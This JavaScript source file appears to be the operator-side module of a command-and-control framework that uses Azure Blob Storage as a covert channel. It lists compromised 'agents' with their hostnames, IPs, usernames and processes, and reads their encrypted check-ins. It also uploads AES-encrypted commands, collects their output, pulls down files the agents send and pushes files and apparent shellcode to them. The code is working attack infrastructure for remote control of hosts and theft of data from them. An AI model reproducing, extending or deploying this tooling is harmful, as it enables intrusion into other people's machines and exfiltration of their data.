const { ipcMain} = require('electron');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs'); 
const fsp = require('fs').promises;
const { log } = require('console');
const { getAppDataDir } = require('./common');
const directories       = getAppDataDir();

function decodeBase64(base64) {
  const buffer = Buffer.from(base64, 'base64');
  return buffer.toString('utf-8');
}
function encodeBase64(input) {
  const buffer = Buffer.from(input, 'utf-8');
  return buffer.toString('base64');
}
async function aesEncrypt(data,key,iv) {
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);

  let encrypted = "";
  if ( Buffer.isBuffer( data ) ) {
    encrypted = Buffer.concat([cipher.update(data), cipher.final()]);
  }
  else { 
    encrypted = cipher.update(data, 'utf8', 'hex');
    encrypted += cipher.final('hex');
  }
  return encrypted;
}
async function aesDecrypt(encryptedData, key, iv) {
  // const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
  // let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
  // decrypted += decipher.final('utf8');
  // return decrypted;
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
  
  let decrypted = "";
  if ( Buffer.isBuffer( encryptedData ) ) {
    decrypted = Buffer.concat([decipher.update(encryptedData), decipher.final()]);
  }
  else { 
    decrypted = decipher.update(encryptedData, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
  }
  return decrypted;
}
async function DeleteStorageContainer(StorageContainer,config)
{
    let options = {
      hostname: global.config.storageAccount,
      port: 443,
      path: `/${StorageContainer}?restype=container&${global.config.sasToken}`,
      method: 'DELETE',
      headers: {
        'x-ms-version': '2020-04-08', 
        'x-ms-date': new Date().toUTCString() 
      }
    };
    return await makeRequest(options);
}
// no deps
async function DeleteStorageBlob(StorageContainer,StorageBlob,config)
{
    let options = {
      hostname: global.config.storageAccount,
      port: 443,
      path: `/${StorageContainer}/${StorageBlob}?${global.config.sasToken}`,
      method: 'DELETE',
      headers: {
        'x-ms-version': '2020-04-08'
      }
    };
    return await makeRequest(options);
}
async function preloadContainers(metaContainer,config)
{
    let meta_agent_container_info = [];
    log(`azure.js | preloadContainers() | global.config: ${JSON.stringify(global.config)}`);
    try {
          let i = 1;
          let options = {
            hostname: global.config.storageAccount,
            port: 443,
            path: `/${global.config.metaContainer}?restype=container&comp=list&${global.config.sasToken}`,
            method: 'GET',
            headers: {
              'x-ms-version': '2020-04-08'
            }
          };
          let response = await makeRequest(options);
          if (response.status === 404){
            log(`azure.js | preloadContainers() | ${response.status} | [!] Container ${global.config.metaContainer} not found. Sleeping for 5 seconds and trying again.`);
            await new Promise(resolve => setTimeout(resolve, 5000)); 
            return null;
          }
          let blobs = response.data.match(/<Name>([^<]+)<\/Name>/g).map(b => b.replace(/<\/?Name>/g, ''));
          for (const blob of blobs) {
              try
              {
                let agent_container = await readBlob(global.config.metaContainer,blob,config);
                if(agent_container.status === 200)
                {
                  let this_agent_info = {
                    'agentid':blob,
                    'containerid':agent_container['data']
                  }
                    meta_agent_container_info.push(this_agent_info);
                }
              }catch(error)
              {
                console.log(`Failed to get agent container ${error.stack}`);
              }
          }
          return JSON.stringify(meta_agent_container_info);
      } catch (error) {
          log(`azure.js | preloadContainers() | Error listing blobs in container ${global.config.metaContainer}:`, error.message, error.stack);
          return null;
      }
}
class Agent {
  constructor() {
      this.agentid = '';
      this.arch = '';
      this.container = '';
      this.hostname = '';
      this.IP = [];
      this.osRelease = '';
      this.osType = '';
      this.PID = null;
      this.platform = '';
      this.Process = '';
      this.username = '';
      this.checkin = Date.now();
      this.aes = {
          'key': null,
          'iv': null
      }; 
      this.blobs = {
          'key': null,
          'checkin': null,
          'in': null,
          'out': null
      };
  }
}
async function updateDashboardTable(containerName,config)
{
    let agentcheckins = [];
    try {
        let thisAgent = null;
        let agentObj  = null;
        let MetaBlobs = await list_blobs(global.config.metaContainer,config);
        for (const agentMetaBlob of MetaBlobs) 
        {
            try
            {
              if(global.agents.find(agent => agent.agentid === agentMetaBlob)){
                log(`azure.js | updateDashboardTable() | ${agentMetaBlob} | [!] Agent ${agentMetaBlob} already exists in global.agents`);
                thisAgent = global.agents.find(agent => agent.agentid === agentMetaBlob);
                log(`azure.js | updateDashboardTable() | ${agentMetaBlob} | Found existing agent object: ${JSON.stringify(thisAgent)}`);
              }
              else{
                log(`azure.js | updateDashboardTable() | ${agentMetaBlob} | [!] Agent ${agentMetaBlob} does not exist in global.agents`);
                thisAgent = new Agent();
                thisAgent.agentid = agentMetaBlob;
                let metaAgentResponse = await readBlob(global.config.metaContainer,agentMetaBlob,config);
                thisAgent.container = metaAgentResponse.data;
                thisAgent.blobs = await getContainerBlobs(thisAgent.container,config);
                thisAgent.aes = await getContainerAesKeys(thisAgent.container,thisAgent.blobs['key'],config);
                let checkinData         = await checkinContainer(thisAgent.container, thisAgent.aes, thisAgent.blobs,config);
                agentObj = JSON.parse(checkinData);
                thisAgent.hostname = agentObj.hostname;
                thisAgent.IP = agentObj.IP;
                thisAgent.osRelease = agentObj.osRelease;
                thisAgent.osType = agentObj.osType;
                thisAgent.PID = agentObj.PID;
                thisAgent.platform = agentObj.platform;
                thisAgent.Process = agentObj.Process;
                thisAgent.username = agentObj.username;
                thisAgent.arch = agentObj.arch;
                global.agents.push(thisAgent);
              }  
              let checkinBlobLastModified = await getBlobLastModified(thisAgent.container,thisAgent.blobs['in']);
              if (!checkinBlobLastModified) 
              {
                log(`azure.js | updateDashboardTable() | ${response.status} | [!] Missing Last-Modified header for agent ${agent_container_id}`);
                thisAgent.checkin = Date.now()-60000;
                continue;
              }
              const timestamp = new Date(checkinBlobLastModified).getTime(); 
              thisAgent.checkin = timestamp;
              agentcheckins.push(thisAgent); 
            }catch(error)
            {
              log(`Failed to get checkin from listed agent container ${error.stack}`);
            }
        }
        return JSON.stringify(agentcheckins);
    } catch (error) {
        console.error(`Error listing blobs in container ${containerName}: ${error.message} ${error.stack}\n ${JSON.stringify(agentcheckins)}`);
        return 0;
    }
}
async function list_blobs(containerName,config)
{
  try{
    let options = {
      hostname: global.config.storageAccount,
      port: 443,
      path: `/${containerName}?restype=container&comp=list&${global.config.sasToken}`,
      method: 'GET',
      headers: {
        'x-ms-version': '2020-04-08'
      }
    };
    let response = await makeRequest(options);
    let blobs = response.data.match(/<Name>([^<]+)<\/Name>/g).map(b => b.replace(/<\/?Name>/g, ''));
    return blobs;
  } catch (error) {
    console.error(`Error listing blobs in container ${containerName}: ${error.message} ${error.stack}`);
    return [];
  }
}
async function getBlobLastModified(containerName,blob)
{
  let options = {
    hostname: global.config.storageAccount,
    port: 443,
    path: `/${containerName}/${blob}?${global.config.sasToken}`,
    method: 'HEAD',
    headers: {
      'x-ms-version': '2020-04-08'
    }
  };
  let response = await makeRequest(options);
  const lastModified = response.response.headers["last-modified"];
  return lastModified;
}
async function returnAgentCheckinInfo(agentContainer,agentInputChannel)
{
  try{
      let checkinBlobLastModified = await getBlobLastModified(agentContainer,agentInputChannel);
      if (!checkinBlobLastModified) 
      {
        log(`azure.js | updateDashboardTable() | ${response.status} | [!] Missing Last-Modified header for agent ${agent_container_id}`);
        thisAgent.checkin = Date.now()-60000;
      }
      return new Date(checkinBlobLastModified).getTime();  
    } catch (error) {
        console.error(`returnAgentCheckinInfo() | Error listing blobs in container ${containerName}:`, error.message, error.stack);
    }
}

async function makeRequest(options, data = null) {
  // Wait for renderer to be ready
  if (!global.dashboardWindow.webContents.isLoading()) {
  } else {
      await new Promise(resolve => {
          global.dashboardWindow.webContents.once('did-finish-load', resolve);
      });
  }

  return new Promise((resolve, reject) => {
      const url = `https://${options.hostname}:${options.port}${options.path}`;
      const requestId = Date.now().toString();
      // Set up response handler before sending request
      const responseHandler = (event, response) => {
          // log(`[WEB-REQUEST ] url   : ${url}`);
          // log(`[WEB-RESPONSE] status: ${response.status}`);
          // log(`[WEB-RESPONSE] data  : ${response.data}`);
          if (response.error) {
              log(`[WEB-REQUEST] Error: ${response.error}`);
              reject(new Error(response.error));
              return;
          }
          resolve({
              response: response,
              status: response.status,
              data: response.data
          });
      };
      // Listen for the response with timeout
      ipcMain.once(`web-request-response-${requestId}`, responseHandler);
      if (data) {
          if (!options.headers) {
              options.headers = {};
          }
          options.headers['Content-Length'] = Buffer.byteLength(data);
      }
      // Send request to renderer
      try {
          global.dashboardWindow.webContents.send('make-web-request', {
              url,
              method: options.method,
              headers: options.headers,
              body: data,
              requestId
          });
      } catch (err) {
          ipcMain.removeListener(`web-request-response-${requestId}`, responseHandler);
          reject(err);
      }
      let timeout = 300000;
      setTimeout(() => {
          ipcMain.removeListener(`web-request-response-${requestId}`, responseHandler);
          reject(new Error(`Web request timed out after ${timeout}ms`));
      }, timeout);
  });
}
async function UploadBlobToContainer(StorageContainer,StorageBlob,data,config)
{

    if ( data == null)
    {
      data = "";
    }
    const options = {
        hostname: global.config.storageAccount,
        port: 443,
        path: `/${StorageContainer}/${StorageBlob}?${global.config.sasToken}`, 
        method: 'PUT',
        headers: {
          'x-ms-version': '2020-02-10', 
          'x-ms-date': new Date().toUTCString(),
          'x-ms-blob-type': 'BlockBlob',
          'Content-Type': 'text/plain', 
          'Content-Length': Buffer.byteLength(data) 
        }
    };
    return makeRequest(options,data);
}
async function readBlob(StorageContainer, StorageBlob, config) {
  try {
      const options = {
          hostname: global.config.storageAccount,
          port: 443,
          path: `/${StorageContainer}/${StorageBlob}?${global.config.sasToken}`,
          method: 'GET',
          headers: {
              'x-ms-version': '2020-02-10',
              'x-ms-date': new Date().toUTCString()
          }
      };
      const response = await makeRequest(options);
      if (!response || response.length === 0 || response.status === 404) {
          throw new Error(`Blob read failed: Empty response from ${StorageBlob}`);
      }
      return response; 
  } catch (error) {
      console.error(`Error reading blob ${StorageBlob}:`, error.message);
      return null; 
  }
}
async function getContainerBlobs(containerName,config)
{
    let inputBlob  = "";
    let outputBlob = "";
    let checkinBlob = "";
    let keyBlob = "";
    try {

        let agent_blobs = await list_blobs(containerName,config);
        for (const blob of agent_blobs)
        {
            if (blob.startsWith('i-')) {
                inputBlob = blob;
            }
            if (blob.startsWith('o-')) {
                outputBlob = blob;
            }
            if (blob.startsWith('c-')) {
                checkinBlob = blob;
            }
            if (blob.startsWith('k-')) {
                keyBlob = blob;
            }
        } 
        const blobs = {
            'key'     : keyBlob,
            'checkin' : checkinBlob,
            'in'      : inputBlob,
            'out'     : outputBlob
        };
        return blobs;
    } catch (error) {
        return false;
    }
}
async function getContainerAesKeys(containerName,containerKeyBlob,config)
{
    try {
        let kBlobContent;
        kBlobContent = await readBlob(containerName, containerKeyBlob, config);
        const kBlobJson = JSON.parse(kBlobContent.data);
        const aes_key = kBlobJson['key']
        const aes_iv  = kBlobJson['iv']
        key = {
            'key':aes_key,
            'iv':aes_iv
        }
        return key;
    } catch (error) {
        log(`getContainerAesKeys() | Error listing blobs in container ${containerName}:`, error.message);
    }
}
async function checkinContainer(containerName, aes, blobs,config)
{
    const aes_key_bytes = Buffer.from(aes['key'], 'hex');
    const aes_iv_bytes  = Buffer.from(aes['iv'],  'hex'); 
    try {
        let checkin         = await readBlob(containerName, blobs['checkin'], config);
        let enc_checkin     = decodeBase64(checkin.data);
        const dec_checkin   = await aesDecrypt(enc_checkin,aes_key_bytes,aes_iv_bytes);
        if (!dec_checkin) {
            console.error('No checkin blob content found.');
            return;
        }else
        {
            return dec_checkin;
        }
    } catch (error) {
        console.error(`Error connecting to container ${containerName}:`, error.message);
    }
}
async function clearBlob(StorageContainer, StorageBlob,config) 
{
  const options = {
    hostname: global.config.storageAccount,
    port: 443,
    path: `/${StorageContainer}/${StorageBlob}?${global.config.sasToken}`,
    method: 'PUT',
    headers: {
      'x-ms-version': '2020-02-10',
      'x-ms-date': new Date().toUTCString(),
      'x-ms-blob-type': 'BlockBlob',
      'Content-Type': 'text/plain',
      'Content-Length': 0 
    }
  };
  return makeRequest(options);
}
async function uploadCommand(containerCmd,config)
{
    let containerCommand = JSON.parse(containerCmd);
    const aes_key_bytes  = Buffer.from(containerCommand.key['key'], 'hex');
    const aes_iv_bytes   = Buffer.from(containerCommand.key['iv'],  'hex'); 
    const inputblob      = containerCommand.blobs['in'];
    const outputblob     = containerCommand.blobs['out'];
    const containerName  = containerCommand.name;
    console.log(`${inputblob} ${outputblob} ${containerName}`);
    const encryptedData = await aesEncrypt(containerCommand.cmd,aes_key_bytes,aes_iv_bytes);
    const b64EncData    = encodeBase64(encryptedData);
    let response = await UploadBlobToContainer(containerCommand.name,containerCommand.blobs['in'],b64EncData,config);
    if(response.status != 201)
    {
      log(`azure.js | uploadCommand() | ${response.status} | [!] Failed to upload command to container ${containerName}`);
      return null;
    }
    let decrypted_out_data;
    const startTime = Date.now();
    let currentTime;
    let elapsed;
    while(true)
    {
        let command_output = await readBlob(containerCommand.name,containerCommand.blobs['out'],config);
        if (command_output === null)
        {
          return null;
        }
        if (command_output['data'])
        {
            let encrypted_out_data = decodeBase64(command_output['data']);
            decrypted_out_data = await aesDecrypt(encrypted_out_data,aes_key_bytes,aes_iv_bytes);
            await clearBlob(containerName,outputblob,config);
            break;
        }
      currentTime = Date.now();
      elapsed = (currentTime - startTime)/1000;
      let waittime = 90;
      if (containerCommand.cmd.includes("scan "))
        {
        waittime = 300;
      }
      if(elapsed > waittime)
      {
        decrypted_out_data = "No response for command.";
        break;
      }
    }
    return decrypted_out_data;
}
async function pullDownloadFile(containerCmd,filename,blob,config)
{
  try{

    log(`azure.js | pullDownloadFile()`);
    let StorageAccount = config.storageAccount;
    let sasToken = config.sasToken;
    let containerCommand = JSON.parse(containerCmd);
    let baseFileName = path.basename(filename);
    log(`pullDownloadFile() | filename     : ${filename}`);
    log(`pullDownloadFile() | blob         : ${blob}`);
    log(`pullDownloadFile() | command info : ${JSON.stringify(containerCommand)}`);
    const aes_key_bytes  = Buffer.from(containerCommand.key['key'], 'hex');
    const aes_iv_bytes   = Buffer.from(containerCommand.key['iv'],  'hex'); 
    let raw;
    if (!fs.existsSync(directories.downloadsDir)) {
        fs.mkdirSync(directories.downloadsDir, { recursive: true });
    }
    const destPath = path.join(directories.downloadsDir, baseFileName);
    const url  = `https://${StorageAccount}/${containerCommand.name}/${blob}?${sasToken}`;
    log(`pullDownloadFile() | URL : ${url}`);
    let buffer;
    let index = 1;
    while(true)
    {
        let response = await fetch(url);
        if (!response.ok) {
          log(`pullDownloadFile loop : ${index} | Failed to download file. Sleeping for 3 seconds and trying again. Status: ${response.status} ${response.statusText}`);
          await new Promise(resolve => setTimeout(resolve, 3000));
        }else
        {
          let arrayBuffer = await response.arrayBuffer();
          buffer = Buffer.from(arrayBuffer);
          break;
        }
        index +=1;
    }
    raw  = await aesDecrypt( buffer, aes_key_bytes, aes_iv_bytes );
    await fsp.writeFile(destPath, raw, (err) => {
      log(`Error writing file: ${err.stack}`);
    });
    log(`File ${destPath} has been saved.`);
    }catch(error)
    {
      log(`pullDownloadFile() Error: ${error} ${error.stack}`);
    }
}
async function uploadSCToAzure(containerCmd, StorageBlob, filePath,config)
{
    let StorageAccount = config.storageAccount;
    let sasToken = config.sasToken;

    try {
      let containerCommand = JSON.parse(containerCmd);
      const aes_key_bytes  = Buffer.from(containerCommand.key['key'], 'hex');
      const aes_iv_bytes   = Buffer.from(containerCommand.key['iv'],  'hex'); 
      const fileContent = await fsp.readFile(filePath);
      const enc         = await aesEncrypt( fileContent, aes_key_bytes, aes_iv_bytes );
      const sasUrl = `https://${StorageAccount}/${containerCommand.name}/${StorageBlob}?${sasToken}`;
      const response = await fetch(sasUrl, {
        port: 443,
        method: 'PUT',
        headers: {
          'x-ms-blob-type': 'BlockBlob',
          'Content-Type': 'application/octet-stream' 
        },
        body: enc
      });
      log(`response ${response.ok}`);
    } catch (error) {
      output = `Error uploading file to azure : ${error.stack}`;
      log(`azure.js | uploadSCToAzure()\r\nError ${output}`);
    }
}
async function uploadFileToAzure(containerCmd, StorageBlob, filePath,config)
{
    let StorageAccount = config.storageAccount;
    let sasToken = config.sasToken;
    try {
      let containerCommand = JSON.parse(containerCmd);
      const aes_key_bytes  = Buffer.from(containerCommand.key['key'], 'hex');
      const aes_iv_bytes   = Buffer.from(containerCommand.key['iv'],  'hex'); 
      const fileContent = await fsp.readFile(filePath);
      const enc         = await aesEncrypt( fileContent, aes_key_bytes, aes_iv_bytes );
      const sasUrl = `https://${StorageAccount}/${containerCommand.name}/${StorageBlob}?${sasToken}`;
      const response = await fetch(sasUrl, {

        port: 443,
        method: 'PUT',
        headers: {
          'x-ms-blob-type': 'BlockBlob',
          'Content-Type': 'application/octet-stream' 
        },
        body: enc
      });
    } catch (error) {
      output = `Error uploading file to azure : ${error.stack}`;
      log(`azure.js | uploadFileToAzure()\r\nError ${output}`);
    }
}
module.exports = {
    getContainerBlobs,
    preloadContainers,
    UploadBlobToContainer,
    readBlob,
    updateDashboardTable,
    checkinContainer,
    getContainerAesKeys,
    uploadCommand,
    returnAgentCheckinInfo,
    uploadFileToAzure,
    uploadSCToAzure,
    pullDownloadFile,
    DeleteStorageContainer,
    DeleteStorageBlob
};